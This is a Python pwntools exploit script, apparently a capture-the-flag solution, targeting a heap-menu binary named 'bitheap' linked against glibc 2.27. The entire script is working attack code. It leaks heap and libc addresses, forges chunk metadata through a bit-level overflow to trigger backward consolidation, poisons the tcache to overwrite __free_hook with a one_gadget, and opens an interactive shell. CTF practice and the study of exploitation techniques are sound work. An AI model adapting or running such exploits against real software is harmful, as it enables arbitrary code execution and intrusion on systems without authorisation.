from pwn import*
context(os='linux',arch='amd64',log_level='debug')

s = process('./bitheap')
libc = ELF('./libc-2.27.so')

def hex_to_bin(h):
	h1 = h & 0xff
	h2 = (h >> 8) & 0xff
	h3 = (h >> 16) & 0xff
	h4 = (h >> 24) & 0xff
	h5 = (h >> 32) & 0xff
	h6 = (h >> 40) & 0xff
	h7 = (h >> 48) & 0xff
	h8 = (h >> 56) & 0xff
	h1 = bin(h1)[2:].rjust(8,'0')[::-1]
	h2 = bin(h2)[2:].rjust(8,'0')[::-1]
	h3 = bin(h3)[2:].rjust(8,'0')[::-1]
	h4 = bin(h4)[2:].rjust(8,'0')[::-1]
	h5 = bin(h5)[2:].rjust(8,'0')[::-1]
	h6 = bin(h6)[2:].rjust(8,'0')[::-1]
	h7 = bin(h7)[2:].rjust(8,'0')[::-1]
	h8 = bin(h8)[2:].rjust(8,'0')[::-1]
	return h1 + h2 + h3 + h4 + h5 + h6 + h7 + h8
	

def add(index,size):
	s.sendlineafter(b'Your choice: ', b'1')
	s.sendlineafter(b'Index: ', str(index))
	s.sendlineafter(b'Size: ', str(size))

def edit(index,content):
	s.sendlineafter(b'Your choice: ', b'2')
	s.sendlineafter(b'Index: ', str(index))
	s.sendafter(b'Content: ', content)

def show(index):
	s.sendlineafter(b'Your choice: ', b'3')
	s.sendlineafter(b'Index: ', str(index))

def delete(index):
	s.sendlineafter(b'Your choice: ', b'4')
	s.sendlineafter(b'Index: ', str(index))

add(0, 0x18)
add(1, 0x18)
delete(0)
delete(1)
add(1, 0x18)
add(0, 0x18)

show(1)
s.recvuntil(b'Content: ')
heap_base = u64(s.recv(6).ljust(8,b'\x00')) - 0x260
success('heap_base=>' + hex(heap_base))

delete(0)
delete(1)

for i in range(12):
	add(i, 0xf8)

for i in range(7):
	delete(i)

delete(7)
edit(8, '1'*8*0xf0 + hex_to_bin(0x200) + '0')
delete(9)

add(0, 0x40)
add(1, 0x30)
add(2, 0x30)
add(3, 0x20)

show(8)
s.recvuntil(b'Content: ')
libc_base = u64(s.recv(6).ljust(8,b'\x00')) - 0x3ebca0
success('libc_base=>' + hex(libc_base))

for i in range(4):
	delete(i)

for i in range(8):
	add(i, 0xf8)

delete(7)
edit(8, hex_to_bin(libc_base + libc.sym['__free_hook']))
add(7, 0xf8)
add(9, 0xf8)
edit(9, hex_to_bin(libc_base + 0x4f302))

delete(0)

#gdb.attach(s)

s.interactive()
